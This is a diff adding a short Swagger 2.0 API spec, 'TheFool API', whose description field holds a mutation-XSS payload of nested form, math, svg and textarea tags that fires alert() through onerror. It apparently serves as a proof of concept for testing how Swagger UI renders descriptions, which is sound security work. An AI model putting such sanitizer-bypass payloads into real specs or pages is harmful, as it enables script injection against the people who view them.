@@ -1,0 +1,17 @@
+{
+  "swagger" : "2.0",
+  "info" : {
+    "description" : "Swagger XSS: x<img alt=\"<img onerror=alert(1)//\"<\"> xxxx <b>xxx</b> <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert('textarea') src=1>\"></form>",
+    "version" : "1.0",
+    "title" : "TheFool API",
+    "termsOfService" : "http://www.flyseccorp.com/",
+    "contact" : {
+      "name" : "Flysec Team"
+    },
+    "license" : {
+      "name" : "Contact Flysec Team",
+      "url" : "http://www.flyseccorp.com/"
+    }
+  },
+  "basePath" : "/bughunter"
+}
